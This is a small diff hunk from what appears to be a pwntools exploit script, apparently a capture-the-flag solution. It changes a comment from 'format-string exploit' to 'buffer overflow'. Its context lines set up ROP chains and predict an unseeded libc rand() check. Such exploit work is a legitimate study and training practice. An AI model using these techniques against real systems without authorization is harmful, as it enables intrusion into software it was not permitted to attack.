@@ -53,7 +53,7 @@ def main():
     rop1 = ROP(exe, badchars=b'\x0a')
     rop2 = ROP(exe, badchars=b'\x0a')
 
-    # To get to the format-string exploit, we need to pass a check whereby
+    # To get to the buffer overflow, we need to pass a check whereby
     # a comparison with an unseeded PRNG value is done
     libc = cdll.LoadLibrary('libc.so.6')
     ans = libc.rand()%100 + 1
